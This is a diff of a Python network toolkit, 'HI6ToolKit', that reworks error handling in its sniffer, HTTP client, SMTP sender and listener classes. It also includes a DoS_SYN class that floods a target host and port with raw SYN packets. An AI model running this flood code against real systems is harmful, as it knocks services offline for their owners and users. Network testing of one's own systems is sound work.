@@ -10,18 +10,18 @@ import ssl
 
 
 class Constant :
-    INFO = f"""\n
-    █ [System] : [{sys.platform.upper()}, {time.ctime()}]
-    █ [Hostname] : [{socket.getfqdn()}]
-    █ [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}]
-
-    █ [GitHub] : [github.com/HI6Cypher]
-    █ [Email] : [huaweisclu31@hotmail.com]\n\n"""
-    MODULE = True if __name__ != "__main__" else False
+    MODULE = __name__ != "__main__"
     TIME = time.time()
     WIN = True if "win" in sys.platform.lower() else False
     SYMBOL = chr(9608)
     INPUT = "\nPress anykey to continue...\n"
+    INFO = f"""\n
+        █ [System] : [{sys.platform.upper()}, {time.ctime()}]
+        █ [Hostname] : [{socket.getfqdn()}]
+        █ [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}]
+
+        █ [GitHub] : [github.com/HI6Cypher]
+        █ [Email] : [huaweisclu31@hotmail.com]\n\n"""
 
 
 class Sniff :
@@ -151,34 +151,29 @@ class Sniff :
             if not Constant.MODULE :
                 print(Constant.INFO)
                 input(Constant.INPUT)
-        except KeyboardInterrupt :
-            sys.exit(1)
-        else :
             self.__sniff()
+        except Exception as error :
+            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
         return None
 
     def __sniff(self) :
-        try :
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
-                sniff.bind((self.host, 0))
-                sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if Constant.WIN else None
-                counter = 1
-                try :
-                    while True :
-                        self.ordered = str()
-                        self.raw_buffer = sniff.recvfrom(65535)[0]
-                        iph = self.ip_header(self.raw_buffer[0:20])
-                        self.__analysis_proto(iph, counter)
-                        self.ordered = self.ordered.expandtabs(4)
-                        print(self.ordered) if not Constant.MODULE else None
-                        self.__save()
-                        counter += 1
-                except KeyboardInterrupt :
-                    sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if Constant.WIN else None
-                    sys.exit(1)
-        except Exception as error :
-            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
+            sniff.bind((self.host, 0))
+            sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if Constant.WIN else None
+            counter = 1
+            try :
+                while True :
+                    self.ordered = str()
+                    self.raw_buffer = sniff.recvfrom(65535)[0]
+                    iph = self.ip_header(self.raw_buffer[0:20])
+                    self.__analysis_proto(iph, counter)
+                    self.ordered = self.ordered.expandtabs(4)
+                    print(self.ordered) if not Constant.MODULE else None
+                    self.__save()
+                    counter += 1
+            except KeyboardInterrupt :
+                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if Constant.WIN else None
         return None
 
 
@@ -244,10 +239,11 @@ class DoS_SYN :
             if not Constant.MODULE :
                 print(Constant.INFO)
                 input(Constant.INPUT)
-        except KeyboardInterrupt :
-            sys.exit(1)
-        else :
             self.__flood()
+        except KeyboardInterrupt :
+            exit(1)
+        except Exception as error :
+            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
         return None
 
     def __flood(self) :
@@ -257,25 +253,20 @@ class DoS_SYN :
             self.rate += 1
         sec = self.rate // 32
         cons = sec
-        try :
-            for i in range(1, self.rate + 1) :
-                payload = self.prepare()
-                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) as flood :
-                    flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                    flood.sendto(payload, (self.host, self.port))
-                    flood.shutdown(socket.SHUT_RDWR)
-                    if i == sec :
-                        print(f"[+] {(i // cons) * Constant.SYMBOL}  {sec} packets sent", end = "\r", flush = True)
-                        sec += cons
-            else :
-                time.sleep(2)
-                end_time = round((time.time() - Constant.TIME), 2)
-                print("\n[+] All packets have sent")
-                print(f"[-] {end_time}s")
-        except KeyboardInterrupt :
-            sys.exit(1)
-        except Exception as error :
-            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
+        for i in range(1, self.rate + 1) :
+            payload = self.prepare()
+            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) as flood :
+                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                flood.sendto(payload, (self.host, self.port))
+                flood.shutdown(socket.SHUT_RDWR)
+                if i == sec :
+                    print(f"[+] {(i // cons) * Constant.SYMBOL}  {sec} packets sent", end = "\r", flush = True)
+                    sec += cons
+        else :
+            time.sleep(2)
+            end_time = round((time.time() - Constant.TIME), 2)
+            print("\n[+] All packets have sent")
+            print(f"[-] {end_time}s")
         return None
 
 
@@ -294,58 +285,54 @@ class HTTP_Request :
             if not Constant.MODULE :
                 print(Constant.INFO)
                 input(Constant.INPUT)
-        except KeyboardInterrupt :
-            sys.exit(1)
-        else :
             self.__request()
+        except KeyboardInterrupt :
+            exit(1)
+        except Exception as error :
+            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
         return None
 
     def __request(self) :
-        try :
-            sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2) if self.https is True else None
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
-                flood = sslcontext.wrap_socket(flood, server_hostname = self.host) if self.https is True else flood
-                payload = [
-                            f"GET {self.end} HTTP/1.1", 
-                            f"Host: {self.host}", 
-                            "User-Agent: HI6ToolKit", 
-                            "Accept: */*", 
-                            "Connection: close", 
-                            "\r\n"]
-                payload = "\r\n".join(payload)
-                print(payload) if not Constant.MODULE else None
-                flood.settimeout(30)
-                flood.connect((self.host, self.port))
-                flood.send(payload.encode())
-                raw_data = bytes()
-                counter = 0
-                space = str()
-                while True :
-                    response = flood.recv(4096)
-                    if not response :
-                        raw_data = raw_data.split(b"\r\n\r\n", 1)
-                        self.response_header = raw_data[0]
-                        self.response = raw_data[-1]
-                        print(28 * chr(32), end = "\n")
-                        if not Constant.MODULE :
-                            print(self.response_header.decode() if isinstance(self.response_header, bytes) else self.response_header, end = "\n\n")
-                            print(self.response.decode() if self.decode else self.response)
-                        flood.close()
-                        break
+        sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2) if self.https is True else None
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
+            flood = sslcontext.wrap_socket(flood, server_hostname = self.host) if self.https is True else flood
+            payload = [
+                        f"GET {self.end} HTTP/1.1", 
+                        f"Host: {self.host}", 
+                        "User-Agent: HI6ToolKit", 
+                        "Accept: */*", 
+                        "Connection: close", 
+                        "\r\n"]
+            payload = "\r\n".join(payload)
+            print(payload) if not Constant.MODULE else None
+            flood.settimeout(30)
+            flood.connect((self.host, self.port))
+            flood.send(payload.encode())
+            raw_data = bytes()
+            counter = 0
+            space = str()
+            while True :
+                response = flood.recv(4096)
+                if not response :
+                    raw_data = raw_data.split(b"\r\n\r\n", 1)
+                    self.response_header = raw_data[0]
+                    self.response = raw_data[-1]
+                    print(28 * chr(32), end = "\n")
+                    if not Constant.MODULE :
+                        print(self.response_header.decode() if isinstance(self.response_header, bytes) else self.response_header, end = "\n\n")
+                        print(self.response.decode() if self.decode else self.response)
+                    flood.close()
+                    break
+                else :
+                    if counter != 16 :
+                        print(f"{counter * Constant.SYMBOL} Downloading", end = "\r", flush = True)
+                        counter += 1
+                        space += 2 * chr(32)
                     else :
-                        if counter != 16 :
-                            print(f"{counter * Constant.SYMBOL} Downloading", end = "\r", flush = True)
-                            counter += 1
-                            space += 2 * chr(32)
-                        else :
-                            print(space, end = "\r", flush = True)
-                            counter = 0
-                            space = str()
-                        raw_data += response
-        except KeyboardInterrupt :
-            sys.exit(1)
-        except Exception as error :
-            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
+                        print(space, end = "\r", flush = True)
+                        counter = 0
+                        space = str()
+                    raw_data += response
         return None
 
 
@@ -364,10 +351,12 @@ class SendEmail :
             if not Constant.MODULE :
                 print(Constant.INFO)
                 input(Constant.INPUT)
+            print(f"[*] setting up socket : socket.SOCK_STREAM")
+            self.__wrap(self.smtp, self.sender, self.sender_password,self.recipients, self.subject, self.text)
         except KeyboardInterrupt :
-            sys.exit(1)
-        print(f"[*] setting up socket : socket.SOCK_STREAM")
-        self.__wrap(self.smtp, self.sender, self.sender_password,self.recipients, self.subject, self.text)
+            exit(1)
+        except Exception as error :
+            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
         return None
 
     def __send(self, socket : socket, payload : str) :
@@ -433,44 +422,39 @@ class SendEmail :
 
     def __wrap(self, smtp_server : str, sender : str, sender_password : str, 
             recipients : list, subject : str, text : str) :
-        try :
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mail :
-                print(f"[*] connecting to the {smtp_server}")
-                mail.connect((smtp_server, 587))
-                conn = mail.recv(1024)
-                if conn.decode().split()[0] == str(220) :
-                    print(f"[+] server {smtp_server} is ready")
-                else :
-                    print(f"[-] server {smtp_server} isn't ready")
-                    mail.close()
-                self.__ehlo(mail, smtp_server)
-                self.__recv(mail)
-                print(f"[*] sending ehlo to the server {smtp_server}")
-                self.__send(mail, "STARTTLS\r\n")
-                self.__recv(mail)
-                print("[*] starting TLS connection")
-                print("[*] wraping socket with TLS connection")
-                ssl_conn = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
-                with ssl_conn.wrap_socket(sock = mail, server_hostname = smtp_server) as protomail :
-                    print("[+] socket successfully wraped")
-                    print(f"[*] sending ehlo to the server {smtp_server} on TLS connection")
-                    self.__ehlo(protomail, smtp_server)
-                    self.__recv(protomail)
-                    print("[*] authenticating...")
-                    auth = self.__authentication(protomail, sender, sender_password)
-                    if auth :
-                        for recipient in recipients :
-                            print(f"[*] sending email to {recipient}")
-                            self.__mailing(protomail, sender, recipient, subject, text)
-                        else :
-                            print(f"[*] sending QUIT to {smtp_server}")
-                            self.__send(protomail, "QUIT")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mail :
+            print(f"[*] connecting to the {smtp_server}")
+            mail.connect((smtp_server, 587))
+            conn = mail.recv(1024)
+            if conn.decode().split()[0] == str(220) :
+                print(f"[+] server {smtp_server} is ready")
+            else :
+                print(f"[-] server {smtp_server} isn't ready")
+                mail.close()
+            self.__ehlo(mail, smtp_server)
+            self.__recv(mail)
+            print(f"[*] sending ehlo to the server {smtp_server}")
+            self.__send(mail, "STARTTLS\r\n")
+            self.__recv(mail)
+            print("[*] starting TLS connection")
+            print("[*] wraping socket with TLS connection")
+            ssl_conn = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            with ssl_conn.wrap_socket(sock = mail, server_hostname = smtp_server) as protomail :
+                print("[+] socket successfully wraped")
+                print(f"[*] sending ehlo to the server {smtp_server} on TLS connection")
+                self.__ehlo(protomail, smtp_server)
+                self.__recv(protomail)
+                print("[*] authenticating...")
+                auth = self.__authentication(protomail, sender, sender_password)
+                if auth :
+                    for recipient in recipients :
+                        print(f"[*] sending email to {recipient}")
+                        self.__mailing(protomail, sender, recipient, subject, text)
                     else :
-                        sys.exit(1)
-        except KeyboardInterrupt :
-            sys.exit(1)
-        except Exception as error :
-            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
+                        print(f"[*] sending QUIT to {smtp_server}")
+                        self.__send(protomail, "QUIT")
+                else :
+                    exit(1)
         return None
 
 
@@ -494,41 +478,39 @@ class Listen :
             if not Constant.MODULE :
                 print(Constant.INFO)
                 input(Constant.INPUT)
-        except KeyboardInterrupt :
-            sys.exit(1)
+        except Exception as error :
+            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
         else :
             self.__listen()
 
     def __listen(self) :
             counter = 1
-            try :
-                with socket.socket(socket.AF_INET, self.proto) as listen :
-                    listen.settimeout(self.timeout)
-                    listen.bind((self.host, self.port))
-                    listen.listen() if self.proto == socket.SOCK_STREAM else None
-                    try :
-                        while True :
-                            conn, address = listen.accept() if self.proto == socket.SOCK_STREAM else listen.recvfrom(1024)
-                            payload = conn.recv(1024) if self.proto == socket.SOCK_STREAM else conn
-                            text = f"\n[{counter}][{time.time()}] connection from {address}\n"
-                            print(text) if not Constant.MODULE else None
-                            if payload :
-                                self.all_data += text + payload.decode()
-                                self.__save()
-                                print(payload.decode()) if not Constant.MODULE else None
-                                counter += 1
-                                self.all_data = str()
-                    except KeyboardInterrupt :
-                        sys.exit(1)
-            except Exception as error :
-                print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
+            with socket.socket(socket.AF_INET, self.proto) as listen :
+                listen.settimeout(self.timeout)
+                listen.bind((self.host, self.port))
+                listen.listen() if self.proto == socket.SOCK_STREAM else None
+                try :
+                    while True :
+                        conn, address = listen.accept() if self.proto == socket.SOCK_STREAM else listen.recvfrom(1024)
+                        payload = conn.recv(1024) if self.proto == socket.SOCK_STREAM else conn
+                        text = f"\n[{counter}][{time.time()}] connection from {address}\n"
+                        print(text) if not Constant.MODULE else None
+                        if payload :
+                            self.all_data += text + payload.decode()
+                            self.__save()
+                            print(payload.decode()) if not Constant.MODULE else None
+                            counter += 1
+                            self.all_data = str()
+                except KeyboardInterrupt :
+                    pass
             return None
 
+
 if not Constant.MODULE :
-    info = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
+    epilog = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
     os.system("clear || cls")
     def manage_args() :
-        parser = argparse.ArgumentParser(prog = "HI6ToolKit", epilog = info, add_help = True)
+        parser = argparse.ArgumentParser(prog = "HI6ToolKit", epilog = epilog, add_help = True)
         parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, EMAIL, LISTEN]")
         parser.add_argument("-m", "--method", type = str, help = "To specify method of tool")
         parser.add_argument("-x", "--host", type = str, help = "To specify host")
@@ -627,5 +609,7 @@ if not Constant.MODULE :
         return None
     try :
         manage_args()
+    except KeyboardInterrupt :
+            exit(1)
     except Exception as error :
         print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
